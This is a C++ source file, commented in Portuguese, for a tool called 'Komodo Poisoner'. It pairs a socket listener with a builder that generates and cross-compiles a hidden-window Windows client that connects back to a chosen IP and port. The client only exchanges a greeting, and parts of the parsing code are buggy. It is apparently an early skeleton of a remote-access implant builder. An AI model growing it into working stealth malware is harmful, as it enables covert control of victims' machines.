//10.66.186.110 
#include <iostream>
#include <string>

//Socket Libs:
#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>

//Bilbiotecas utilizadas no builder:
#include <fstream>

//Variaveis utilizadas para receber as informaçôes para a conexão.
const int command_size = 100;
char command[command_size];
std::string ip = "";
std::string _port = "";
int port = 0;
int i = 0;
bool parameters_found = false;
bool hifen_encontrado = false;

//Variaveis utilizadas no modulo de conexão:
int server_fd, new_socket, valread;
struct sockaddr_in address;
int opt = 1;
int addrlen = sizeof(address);
char buffer[1024] = {0};
const char* hello = "Hello from server";

//Variaveis utilizadas no builder:
std::string build_content_1 = "#include <winsock2.h>\n#include <windows.h>\n#include <iostream>\n#include <ws2tcpip.h>\n#include <cstring>\nint main() {\nWSADATA wsaData;\nSOCKET clientSocket = INVALID_SOCKET;\nstruct sockaddr_in serverAddress;\nconst char* hello = \"Hello from client\";\nchar buffer[1024] = {0};\nif (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\nstd::cerr << \"Falha na inicialização do Winsock\" << std::endl;\nreturn -1;\n}\n/* Criando o socket*/\nif ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {\nstd::cerr << \"Falha na criação do socket\" << std::endl;\nWSACleanup();\nreturn -1;\n}\nserverAddress.sin_family = AF_INET;\nserverAddress.sin_port = htons(";
std::string build_content_2 = ");\nserverAddress.sin_addr.s_addr = inet_addr(\"";
std::string build_content_3 = "\");\nif (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {\nstd::cerr << \"Erro na conexão com o servidor\" << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn -1;\n}\nif (send(clientSocket, hello, strlen(hello), 0) < 0) {\nstd::cerr << \"Erro no envio de dados ao servidor\" << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn -1;\n}\nif (recv(clientSocket, buffer, sizeof(buffer), 0) < 0) {\nstd::cerr << \"Erro na recepção da resposta do servidor\" << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn -1;\n}\nstd::cout << \"Resposta do servidor: \" << buffer << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn 0;\n}";

//Declaração das funçôes
int port_extractor();
int ip_extractor();
int function_loader();
int open_listener();
int builder();

int main(){
        system("clear");
        std::cout << "Komodo Poisoner\n";
        std::cout << "Usage:\n";
        std::cout << "listener -p <PORT>\nserver -h <IP> -p <PORT>\n";

        std::string teste = "quebra\nde\nlinha\n";
        std::cout << teste;

        std::cout << "\n$: ";
        std::cin.getline(command, command_size);

        if(function_loader() != 0){
                std::cout << "Erro ao extrair os parâmetros\n";
        }

        std::cout << "A porta é: " << port << '\n';
        std::cout << "O IP é: " << ip << '\n';

return 0;
}//Fim do main

int port_extractor(){

        hifen_encontrado = false;

        do{
                if(command[i] == '-'){
                        std::cout << "Hifen Encontrado\n";
                        hifen_encontrado = true;
                }else{
                        std::cout << "Hifen não encontrado\n";
                        ++i;
                }

                if(i >= 100){
                        std::cout << "Sintaxe incorreta\n";
                        break;
                }
        }while(hifen_encontrado != true);

        i += 3;

        for(int j = 0; j < 4; j++){
                if(command[i] != ' '){
                        _port += command[i];
                }
        ++i;

        }
        port = std::stoi(_port);
        return 0;
}

int ip_extractor(){

        hifen_encontrado = false;

        do{
                if(command[i] == '-'){
                        std::cout << "Hifen Encontrado\n";
                        hifen_encontrado = true;
                }else{
                        std::cout << "Hifen não encontrado\n";
                        ++i;
                }

                if(i >= 100){
                        std::cout << "Sintaxe incorreta\n";
                        break;
                }
        }while(hifen_encontrado != true);

        i += 3;


        for(int j = 0; j < 15; j++){
                if(command[i] == '-'){
                        break;
                }

                if(command[i] != ' '){
                        ip += command[i];
                }
                ++i;
        }
return 0;
}

int function_loader(){

        if(command[0] == 'l'){
                if(port_extractor() == 0){
                        std::cout << "Porta extraida com sucesso\n";
                }else{
                        std::cout << "Erro ao extrair a porta\n";
                }

                std::cout << "Iniciando Listener\n";
                if(open_listener() != 0)
                {
                        std::cout << "Erro ao iniciar o Listener\n";
                }

                }else if(command[0] == 'b'){
                        if(ip_extractor() == 0){
                                std::cout << "IP extraido com sucesso";
                        }else{
                        std::cout << "Erro ao extrair o IP\n";
                        }

                        if(port_extractor() == 0){
                                std::cout << "Porta extraida com sucesso\n";
                        }else{
                                std::cout << "Erro ao extrair a porta\n";
                        }
        std::cout << "Chamando Builder\n";
        builder();
        }else{
                std::cout << "Sintaxe Incorreta\n";
        }


        return 0;
}

int open_listener()
{
    // Criando o socket
        std::cout << "Criando socket\n";
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        std::cerr << "Falha na criação do socket" << std::endl;
        return -1;
    }

        std::cout << "Configurando Socket\n";
    // Configurando opções do socket
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        std::cerr << "Erro na configuração das opções do socket" << std::endl;
        return -1;
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);

    // Vinculando o socket a um endereço
        std::cout << "Vinculando (binding) o socket\n";
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        std::cerr << "Erro na vinculação do socket a um endereço" << std::endl;
        return -1;
    }

    // Aguardando conexões
        std::cout << "Aguardando pelo client\n";
    if (listen(server_fd, 3) < 0) {
        std::cerr << "Erro na espera por conexões" << std::endl;
        return -1;
    }

    // Aceitando a conexão de um cliente
    if ((new_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0) {
        std::cerr << "Erro na aceitação da conexão" << std::endl;
        return -1;
    }

        std::cout << "Cliente conectado com sucesso\n";

    // Recebendo dados do cliente
    valread = read(new_socket, buffer, 1024);
    std::cout << buffer << std::endl;

    // Enviando resposta ao cliente
    send(new_socket, hello, strlen(hello), 0);
    std::cout << "Resposta enviada ao cliente" << std::endl;

    // Fechando o socket
    close(new_socket);
    close(server_fd);

        return 0;
}


int builder()
{
        std::ofstream arquivocpp("build.cpp");


        arquivocpp << build_content_1;
        arquivocpp << port;
        arquivocpp << build_content_2;
        arquivocpp << ip;
        arquivocpp << build_content_3;

	arquivocpp.close();

	std::ofstream call_compiler("call_compiller.sh");
	call_compiler << "i686-w64-mingw32-g++ build.cpp -o build.exe -lws2_32 -static-libgcc -static-libstdc++ -mwindows";
	call_compiler.close();
	system("chmod +x ./call_compiller.sh && ./call_compiller.sh");
/*    
#include <iostream>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include <cstring>\nint main() {\nWSADATA wsaData;\nSOCKET clientSocket = INVALID_SOCKET;\nstruct sockaddr_in serverAddress;
    \nconst char* hello = \"Hello from client\";
    \nchar buffer[1024] = {0};

    \n// Inicializando o Winsock
    \nif (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        \nstd::cerr << \"Falha na inicialização do Winsock\" << std::endl;
        \nreturn -1;
    \n}

    \n// Criando o socket
    \nif ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        \nstd::cerr << \"Falha na criação do socket\" << std::endl;
        \nWSACleanup();
        \nreturn -1;
    \n}

    \n// Configurando o endereço do servidor
    \nserverAddress.sin_family = AF_INET;
    \nserverAddress.sin_port = htons(port);
    \nserverAddress.sin_addr.s_addr = inet_addr(ip);

    \n// Conectando ao servidor
    \nif (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        \nstd::cerr << \"Erro na conexão com o servidor\" << std::endl;
        \nclosesocket(clientSocket);
        \nWSACleanup();
        \nreturn -1;
    \n}

    \n// Enviando dados ao servidor
    \nif (send(clientSocket, hello, strlen(hello), 0) < 0) {
        \nstd::cerr << \"Erro no envio de dados ao servidor\" << std::endl;
        \nclosesocket(clientSocket);
        \nWSACleanup();
        \nreturn -1;
    \n}

    \n// Recebendo resposta do servidor
    \nif (recv(clientSocket, buffer, sizeof(buffer), 0) < 0) {
        \nstd::cerr << \"Erro na recepção da resposta do servidor\" << std::endl;
        \nclosesocket(clientSocket);
        \nWSACleanup();
        \nreturn -1;
    \n}
    \nstd::cout << \"Resposta do servidor: \" << buffer << std::endl;

    \n// Fechando o socket
    \nclosesocket(clientSocket);

    \n// Finalizando o Winsock
    \nWSACleanup();

    return 0;
}

*/
return 0;
}
